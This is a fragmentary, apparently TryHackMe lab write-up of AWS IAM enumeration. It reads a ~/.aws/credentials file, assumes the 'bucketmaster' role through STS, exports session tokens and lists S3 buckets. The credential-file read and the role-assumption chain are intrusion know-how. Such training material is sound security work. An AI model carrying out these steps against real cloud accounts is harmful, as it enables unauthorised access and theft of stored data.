...
```powershell
user@machine$ aws sts get-caller-identity{    "UserId": "x",    "Account": "332173347248",    "Arn": "arn:aws:iam::332173347248:user/sir.carrotbane"}
```
...
```
ubuntu@tryhackme:~$ cd .aws
ubuntu@tryhackme:~/.aws$ cat credentials 
[default]
aws_access_key_id = x
aws_secret_access_key = x
...
ubuntu@tryhackme:~/.aws$ aws iam list-attached-user-policies --user-name sir.carrotbane

{
    "AttachedPolicies": []
}
ubuntu@tryhackme:~/.aws$ aws iam list-groups-for-user --user-name sir.carrotbane

{
    "Groups": []
}
ubuntu@tryhackme:~/.aws$ aws iam get-user-policy --policy-name SirCarrotbanePolicy --user-name sir.carrotbane
    ...
    "Roles": [
        {
            "Path": "/",
            "RoleName": "bucketmaster",
            "RoleId": "AROARZPUZDIKOSMV2G2LS",
            "Arn": "arn:aws:iam::123456789012:role/bucketmaster",
            "CreateDate": "2025-12-23T16:06:41.629427+00:00",
            "AssumeRolePolicyDocument": {
                "Statement": [
                    {
                        "Action": "sts:AssumeRole",
...

{
    "Credentials": {
        "AccessKeyId": "x",
        "SecretAccessKey": "x",
        "SessionToken": "",
        "Expiration": "2025-12-23T17:22:57.848817+00:00"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROARZPUZDIKOSMV2G2LS:TBFC",
        "Arn": "arn:aws:sts::123456789012:assumed-role/bucketmaster/TBFC"
    },
    "PackedPolicySize": 6
}
...
export AWS_SESSION_TOKEN=""

aws sts get-caller-identity

{
    "UserId": "07anguwce97n9cfe814w",
...
aws sts assume-role --role-arn arn:aws:iam::123456789012:role/bucketmaster --role-session-name TBFC
{
    "Credentials": {
        "AccessKeyId": "x",
        "SecretAccessKey": "x",
        "SessionToken": "",
        "Expiration": "2025-12-23T18:05:20.915290+00:00"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROARZPUZDIKNPKAONABD:TBFC",
        "Arn": "arn:aws:sts::123456789012:assumed-role/bucketmaster/TBFC"
    },
    "PackedPolicySize": 6
}
...
export AWS_SESSION_TOKEN=""
...
aws sts get-caller-identity
{
    "UserId": "AROARZPUZDIKNPKAONABD:TBFC",
    "Account": "123456789012",
    "Arn": "arn:aws:sts::123456789012:assumed-role/bucketmaster/TBFC"
}
    ...
    "Buckets": [
        {
            ...
            "CreationDate": "2025-12-23T17:00:36+00:00"
        },
        {
    ...
    "Contents": [
        {
            ...
            "LastModified": "2025-12-23T17:00:36+00:00",
